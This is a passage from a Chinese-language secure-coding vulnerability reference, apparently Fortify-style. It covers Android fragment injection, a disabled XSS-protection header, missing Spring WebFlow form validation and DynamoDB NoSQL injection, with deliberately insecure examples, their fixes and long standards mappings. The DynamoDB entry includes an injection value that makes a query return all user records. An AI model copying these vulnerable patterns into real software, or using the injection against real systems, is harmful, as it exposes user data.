<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20) </p>
<h4 id="Fragment-Injection"><a href="#Fragment-Injection" class="headerlink" title="Fragment Injection"></a>Fragment Injection</h4><h5 id="ABSTRACT-353"><a href="#ABSTRACT-353" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>扩展 PreferenceActivity 的 Android 活动无法限制其可实例化的片段类。</p>
<h5 id="EXPLANATION-353"><a href="#EXPLANATION-353" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>恶意应用程序可调用不安全的 PreferenceActivity 并且为其提供 :android:show_fragment Intent 额外项，使其加载任意类。 恶意应用程序可使 PreferenceActivity 加载易受攻击应用程序的任意 Fragment，它在非导出活动内可正常加载，从而将应用程序暴露给攻击者。</p>
<p>示例 1： 以下代码无法实现用于验证是否仅加载预期片段的检查。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line"></span><br><span class="line">public static boolean isFragmentValid(Fragment paramFragment)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-352"><a href="#RECOMMENDATIONS-352" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>Google 在 Android 4.4 (KitKat) 中提供了一项新的受保护 API PreferenceActivity.isValidFragment，在片段由 PreferenceActivity 进行动态实例化前会调用该 API。 必须使用严格的白名单方法实现 isValidFragment 法，以仅允许加载预期片段。</p>
<p>示例 2： 以下代码实现的检查可用于验证是否仅加载预期片段。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line"></span><br><span class="line">public static boolean isFragmentValid(Fragment paramFragment)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    boolean valid = checkFragmentAgainstWhitelist(paramFragment);</span><br><span class="line"></span><br><span class="line">    // checkFragmentAgainstWhitelist() is a custom whitelisting function, returning true if valid, and false otherwise.</span><br><span class="line"></span><br><span class="line">    return valid;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-351"><a href="#REFERENCES-351" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Roee Hay A New Vulnerability in the Android Framework: Fragment Injection </p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 470 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001764, CCI-001774, CCI-002754 </p>
<p>[4] Standards Mapping - FIPS200 SI </p>
<p>[5] Standards Mapping - General Data Protection Regulation Access Violation </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection </p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws </p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws </p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A1 Injection </p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A1 Injection </p>
<p>[12] Standards Mapping - OWASP Top 10 2017 A1 Injection </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.8 </p>
<p>[20] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.4 - Authentication and Access Control </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20) </p>
<h4 id="HTML5-Cross-Site-Scripting-Protection"><a href="#HTML5-Cross-Site-Scripting-Protection" class="headerlink" title="HTML5: Cross-Site Scripting Protection"></a>HTML5: Cross-Site Scripting Protection</h4><h5 id="ABSTRACT-354"><a href="#ABSTRACT-354" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>明确禁用了可能提高 Cross-Site Scripting 攻击风险的 X-XSS-Protection 标头。</p>
<h5 id="EXPLANATION-354"><a href="#EXPLANATION-354" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>X-XSS-Protection 是指在 Internet Explorer 8 和更高版本以及 Chrome 的最新版本中自动启用的标头。将标头值设置为 false (0) 后，禁用 Cross-Site Scripting 保护功能。</p>
<p>可以在多个位置设置标头，并且应检查其中是否存在配置错误和恶意篡改问题。</p>
<p>示例：以下代码配置了受 Spring Security 保护的应用程序，以禁用 XSS 保护功能：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;http auto-config=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">       &lt;headers&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">           &lt;xss-protection xss-protection-enabled=&quot;false&quot; /&gt;</span><br><span class="line"></span><br><span class="line">       &lt;/headers&gt;</span><br><span class="line"></span><br><span class="line">&lt;/http&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-353"><a href="#RECOMMENDATIONS-353" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为享有额外的安全层，请尽可能启用 XSS 保护标头。具体做法是添加包含值 “X-XSS-Protection: 1; mode=block” 的 X-XSS-Protection 标头。默认情况下，Spring Security 等框架将包含此标头。在其他情况下，确保不将其禁用。</p>
<h5 id="REFERENCES-352"><a href="#REFERENCES-352" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] IE8 Security Part IV: The XSS Filter </p>
<p>[2] OWASP: List of useful HTTP headers </p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 554, CWE ID 1173 </p>
<p>[4] Standards Mapping - Common Weakness Enumeration Top 25 2019 [3] CWE ID 020 </p>
<p>[5] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[6] Standards Mapping - FIPS200 CM </p>
<p>[7] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[8] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[9] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.1.3 Input Validation Requirements, 5.1.4 Input Validation Requirements, 14.1.3 Build </p>
<p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[11] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management </p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[14] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.7 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.7 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.7 </p>
<p>[22] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15) </p>
<h4 id="Missing-Form-Field-Validation"><a href="#Missing-Form-Field-Validation" class="headerlink" title="Missing Form Field Validation"></a>Missing Form Field Validation</h4><h5 id="ABSTRACT-355"><a href="#ABSTRACT-355" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序未对表单数据执行任何验证。</p>
<h5 id="EXPLANATION-355"><a href="#EXPLANATION-355" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>应用程序无法验证从 Web 表单收到的数据类型。 比较好的做法是，验证收到的数据是否满足为预期数据定义的要求。 </p>
<p>示例 1： 以下代码定义了 Spring WebFlow FormAction，它无法根据预期要求验证数据： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;customerCriteriaAction&quot; class=&quot;org.springframework.webflow.action.FormAction&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property name=&quot;formObjectClass&quot;</span><br><span class="line"></span><br><span class="line">        value=&quot;com.acme.domain.CustomerCriteria&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property name=&quot;propertyEditorRegistrar&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;bean</span><br><span class="line"></span><br><span class="line">            class=&quot;com.acme.web.PropertyEditors&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure>
<p>示例 2： 以下代码定义了 Spring WebFlow 操作状态，它无法根据预期要求验证数据： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;action-state&gt;</span><br><span class="line"></span><br><span class="line">    &lt;action bean=&quot;transferMoneyAction&quot; method=&quot;bind&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/action-state&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-354"><a href="#RECOMMENDATIONS-354" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>比较好的做法是，始终验证收到的数据，以便确认它满足预期数据的要求。</p>
<p>示例 3：以下代码实现的功能与Example 1 相同，但会使用自定义验证例程来验证数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;transferMoneyAction&quot; class=&quot;org.springframework.webflow.action.FormAction&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property name=&quot;formObjectClass&quot;</span><br><span class="line"></span><br><span class="line">        value=&quot;com.acme.domain.CustomerCriteria&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property name=&quot;propertyEditorRegistrar&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;bean</span><br><span class="line"></span><br><span class="line">            class=&quot;com.acme.web.PropertyEditors&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property name=&quot;validator&quot;&gt; &lt;bean class=&quot;com.acme.services.TransferRecordValidator&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure>
<p>示例 4：以下代码实现的功能与Example 2 相同，但会使用自定义验证例程来验证数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;action-state&gt;</span><br><span class="line"></span><br><span class="line">    &lt;action bean=&quot;transferMoneyAction&quot; method=&quot;bindAndValidate&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/action-state&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-353"><a href="#REFERENCES-353" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 108 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [3] CWE ID 020 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[4] Standards Mapping - FIPS200 SI </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.1.3 Input Validation Requirements, 5.1.4 Input Validation Requirements </p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input </p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[11] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15) </p>
<h4 id="NoSQL-Injection-DynamoDB"><a href="#NoSQL-Injection-DynamoDB" class="headerlink" title="NoSQL Injection: DynamoDB"></a>NoSQL Injection: DynamoDB</h4><h5 id="ABSTRACT-356"><a href="#ABSTRACT-356" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>通过不可信赖的数据源输入构建动态 DynamoDB 查询，攻击者就能够修改语句的含义。</p>
<h5 id="EXPLANATION-356"><a href="#EXPLANATION-356" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>发生以下情况时，DynamoDB 中会出现 NoSQL Injection 漏洞：</p>
<p>1.数据从一个不可信赖的数据源进入程序。</p>
<p>2.数据用于动态地构造 DynamoDB 查询。</p>
<p>示例 1：以下代码将动态地构造并执行 DynamoDB 查询，以通过给定的电子邮件地址或用户名来搜索用户及其密码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">    // &quot;type&quot; parameter expected to be either: &quot;Email&quot; or &quot;Username&quot;</span><br><span class="line"></span><br><span class="line">    String type = request.getParameter(&quot;type&quot;)</span><br><span class="line"></span><br><span class="line">    String value = request.getParameter(&quot;value&quot;)</span><br><span class="line"></span><br><span class="line">    String password = request.getParameter(&quot;password&quot;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    DynamoDbClient ddb = DynamoDbClient.create();</span><br><span class="line"></span><br><span class="line">    HashMap&lt;String, AttributeValue&gt; attrValues = new HashMap&lt;String,AttributeValue&gt;();</span><br><span class="line"></span><br><span class="line">    attrValues.put(&quot;:value&quot;, AttributeValue.builder().s(value).build());</span><br><span class="line"></span><br><span class="line">    attrValues.put(&quot;:password&quot;, AttributeValue.builder().s(password).build());</span><br><span class="line"></span><br><span class="line">    ScanRequest queryReq = ScanRequest.builder()</span><br><span class="line"></span><br><span class="line">        .filterExpression(type + &quot; = :value AND Password = :password&quot;)</span><br><span class="line"></span><br><span class="line">        .tableName(&quot;users&quot;)</span><br><span class="line"></span><br><span class="line">        .expressionAttributeValues(attrValues)</span><br><span class="line"></span><br><span class="line">        .build();</span><br><span class="line"></span><br><span class="line">    ScanResponse response = ddb.scan(queryReq);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>查询计划执行以下代码：</p>
<p><code>Email = :value AND Password = :password</code></p>
<p>或者 </p>
<p><code>Username = :value AND Password = :password</code></p>
<p>但是，由于该查询是动态构造的，由一个常数基本查询字符串和一个用户输入字符串连接而成，因此只有在 type 仅包含任何预期值时，该查询才能正常运行。如果攻击者提供 :value = :value OR :value 等类型值，则该查询会变成：</p>
<p><code>:value = :value OR :value = :value AND Password = :password</code></p>
<p>如果添加条件 <code>:value = :value</code>，where 子句的值将始终为 true，这样无论电子邮件的所有者是谁，该查询都会返回 users 集合中存储的所有条目。RECOMMENDATIONS</p>
<p>避免基于注入的攻击的传统方法之一是，将它们作为输入验证问题来处理，并仅接受安全值白名单中的字符。列入白名单是一种非常有效的方法，它可以强制执行严格的输入验证规则。但是，在某些情况下，可能无法轻松构造安全的白名单或验证模式。例如，虽然验证数字字段或仅包含英文字母字符的用户名非常简单，但是验证允许使用元字符的博客帖子就比较困难。</p>
<p>避免 DynamoDB 中的 NoSQL Injection 的最佳解决方法是，使用参数绑定而非动态字符串连接来生成查询字符串。</p>
<h5 id="REFERENCES-354"><a href="#REFERENCES-354" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Testing for NoSQL injection OWASP</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 89, CWE ID 943 </p>
<p>[4] Standards Mapping - Common Weakness Enumeration Top 25 2019 [6] CWE ID 089 </p>
<p>[5] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001310, CCI-002754 </p>
<p>[6] Standards Mapping - FIPS200 SI </p>
<p>[7] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[8] Standards Mapping - MISRA C 2012 Rule 1.3 </p>
<p>[9] Standards Mapping - MISRA C++ 2008 Rule 0-3-1 </p>
<p>[10] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[11] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.3.4 Output Encoding and Injection Prevention Requirements, 5.3.5 Output Encoding and Injection Prevention Requirements </p>
<p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection </p>
<p>[13] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws </p>
<p>[14] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws </p>
<p>[15] Standards Mapping - OWASP Top 10 2010 A1 Injection </p>
<p>[16] Standards Mapping - OWASP Top 10 2013 A1 Injection </p>
<p>[17] Standards Mapping - OWASP Top 10 2017 A1 Injection </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[23] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[24] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[25] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[26] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 089 </p>
<p>[27] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 089 </p>
<p>[28] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 089 </p>
